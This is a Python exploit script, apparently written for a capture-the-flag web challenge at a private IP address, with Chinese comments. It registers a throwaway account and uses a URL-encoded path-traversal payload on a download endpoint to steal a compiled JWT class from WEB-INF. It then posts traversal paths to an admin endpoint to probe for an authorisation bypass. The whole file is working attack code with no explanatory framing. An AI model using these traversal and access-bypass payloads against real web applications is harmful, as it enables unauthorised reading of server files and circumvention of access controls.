#!/usr/bin/env python3
"""
读取JwtUtil并分析JWT验证逻辑
"""

import requests
import random

BASE_URL = "http://192.168.18.25:25004"
session = requests.Session()

def register_and_login():
    username = f"user{random.randint(10000, 99999)}"
    password = "password123"
    
    session.post(f"{BASE_URL}/register", data={"username": username, "password": password})
    r = session.post(f"{BASE_URL}/login", data={"username": username, "password": password})
    print(f"[+] 登录: {username}")
    
    # 打印cookies
    print(f"[*] Cookies: {session.cookies.get_dict()}")
    return username

def download_jwtutil():
    """下载JwtUtil.class"""
    print("\n[*] 下载JwtUtil.class...")
    
    path = "uploads%2f..%2fWEB-INF%2fclasses%2fcom%2fctf%2fJwtUtil.class"
    r = session.get(f"{BASE_URL}/download?path={path}")
    
    if r.status_code == 200:
        with open("JwtUtil.class", "wb") as f:
            f.write(r.content)
        print(f"[+] 已保存到JwtUtil.class ({len(r.content)} bytes)")
        return True
    else:
        print(f"[!] 下载失败: {r.status_code}")
        return False

def test_resource_dir_values():
    """测试resourceDir可能的默认值"""
    print("\n[*] 测试resourceDir的默认值...")
    
    # resourceDir可能的默认值
    possible_dirs = [
        "uploads",
        "files",
        "/uploads",
        "./uploads",
        "resources",
    ]
    
    # 如果resourceDir为null或未初始化，可能导致特殊行为
    # 让我们尝试访问/dashboard/list看看当前能列出什么
    
    r = session.get(f"{BASE_URL}/dashboard/list")
    if r.status_code == 200:
        print(f"\n[*] 当前/dashboard/list响应:")
        print(r.text[:500])

def try_admin_without_auth():
    """尝试不带admin权限访问challengeResourceDir"""
    print("\n[*] 尝试访问/admin/challengeResourceDir...")
    
    # POST请求
    test_paths = [
        "../",
        "../../",
        "/",
        "WEB-INF",
        "WEB-INF/classes",
    ]
    
    for path in test_paths:
        r = session.post(f"{BASE_URL}/admin/challengeResourceDir", data={"new-path": path})
        print(f"\n[{r.status_code}] new-path={path}")
        if r.status_code != 401:
            print(f"响应: {r.text}")

def main():
    print(f"[*] 分析JWT和resourceDir {BASE_URL}")
    username = register_and_login()
    
    download_jwtutil()
    test_resource_dir_values()
    try_admin_without_auth()

if __name__ == "__main__":
    main()
